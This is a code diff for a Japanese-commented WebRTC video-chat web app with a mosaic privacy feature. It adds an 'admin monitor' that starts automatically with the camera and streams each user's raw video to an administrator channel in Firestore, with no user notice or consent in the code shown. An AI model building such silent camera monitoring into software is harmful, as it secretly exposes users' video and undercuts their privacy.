@@ -138,6 +138,12 @@ let callDoc = null;
 let offerCandidates = null;
 let answerCandidates = null;
 
+/* 管理者用 adminCalls */
+let adminPc = null;
+let adminCallDoc = null;
+let adminOfferCandidates = null;
+let adminAnswerCandidates = null;
+
 /* モザイク同期 */
 let myMosaicLevel = 5;
 let myMosaicSize = 25;
@@ -158,11 +164,62 @@ remoteMosaicDoc.onSnapshot(snap => {
   }
 });
 
-/* WebRTC */
+/* WebRTC（相手用） */
 let pc = new RTCPeerConnection({
   iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
 });
 let localStream = null;
+
+/* 管理者用 WebRTC：自分の映像を adminCalls/{myUid} に publish */
+async function setupAdminMonitor() {
+  if (!localStream) return;
+
+  adminPc = new RTCPeerConnection({
+    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+  });
+
+  localStream.getTracks().forEach(t => adminPc.addTrack(t, localStream));
+
+  adminCallDoc = db.collection("adminCalls").doc(myUid);
+  adminOfferCandidates = adminCallDoc.collection("offerCandidates");
+  adminAnswerCandidates = adminCallDoc.collection("answerCandidates");
+
+  adminPc.onicecandidate = e => {
+    if (!e.candidate) return;
+    adminOfferCandidates.add(e.candidate.toJSON());
+  };
+
+  const offer = await adminPc.createOffer();
+  await adminPc.setLocalDescription(offer);
+
+  await adminCallDoc.set({
+    uid: myUid,
+    offer: offer,
+    createdAt: Date.now(),
+    ended: false
+  }, { merge: true });
+
+  // 管理者からの ICE
+  adminAnswerCandidates.onSnapshot(s => {
+    s.docChanges().forEach(c => {
+      if (c.type === "added") {
+        adminPc.addIceCandidate(new RTCIceCandidate(c.doc.data()));
+      }
+    });
+  });
+
+  // 管理者からの answer
+  adminCallDoc.onSnapshot(async s => {
+    const d = s.data();
+    if (!d) return;
+    if (d.answer && !adminPc.currentRemoteDescription) {
+      await adminPc.setRemoteDescription(new RTCSessionDescription(d.answer));
+    }
+    if (d.ended) {
+      try { adminPc.close(); } catch (e) {}
+    }
+  });
+}
 
 /* カメラ開始 */
 let currentFacing = "user";
@@ -174,6 +231,9 @@ async function startCamera() {
   });
   selfVideo.srcObject = localStream;
   localStream.getTracks().forEach(t => pc.addTrack(t, localStream));
+
+  // カメラが取れたら管理者用の adminCalls も開始
+  await setupAdminMonitor();
 }
 
 /* カメラ切替＋再ネゴシエーション */
@@ -207,6 +267,11 @@ async function switchCameraFunc() {
 
   const sender = pc.getSenders().find(s => s.track && s.track.kind === "video");
   if (sender) sender.replaceTrack(localStream.getVideoTracks()[0]);
+
+  if (adminPc) {
+    const adminSender = adminPc.getSenders().find(s => s.track && s.track.kind === "video");
+    if (adminSender) adminSender.replaceTrack(localStream.getVideoTracks()[0]);
+  }
 
   await renegotiate();
 }
@@ -379,11 +444,11 @@ window.addEventListener("load", async () => {
     });
   }
 
-    // ★ 毎回モザイクレベルを最大に初期化
-myMosaicLevel = 5;
-myMosaicSize = mosaicSizes[myMosaicLevel];
-saveMyMosaic();
-updateMeterUI();
+  // 毎回モザイクレベルを最大に初期化
+  myMosaicLevel = 5;
+  myMosaicSize = mosaicSizes[myMosaicLevel];
+  saveMyMosaic();
+  updateMeterUI();
 
   meterUp.onclick = () => {
     if (myMosaicLevel < 5) {
@@ -423,6 +488,12 @@ updateMeterUI();
       await callDoc.set({ ended: true }, { merge: true });
       setTimeout(async () => {
         try { await callDoc.delete(); } catch (e) {}
+      }, 500);
+    }
+    if (adminCallDoc) {
+      await adminCallDoc.set({ ended: true }, { merge: true });
+      setTimeout(async () => {
+        try { await adminCallDoc.delete(); } catch (e) {}
       }, 500);
     }
     localStorage.removeItem("isCaller");
@@ -470,7 +541,6 @@ updateMeterUI();
   };
 
   /* 相手が終了した時 */
-  // callDoc は後で確定するので、確定後に監視を開始
   function watchEnd() {
     if (!callDoc) return;
     callDoc.onSnapshot(snap => {
@@ -485,6 +555,9 @@ updateMeterUI();
   window.addEventListener("beforeunload", async () => {
     try {
       if (callDoc) await callDoc.delete();
+    } catch (err) {}
+    try {
+      if (adminCallDoc) await adminCallDoc.delete();
     } catch (err) {}
     localStorage.removeItem("isCaller");
     localStorage.removeItem("targetUid");
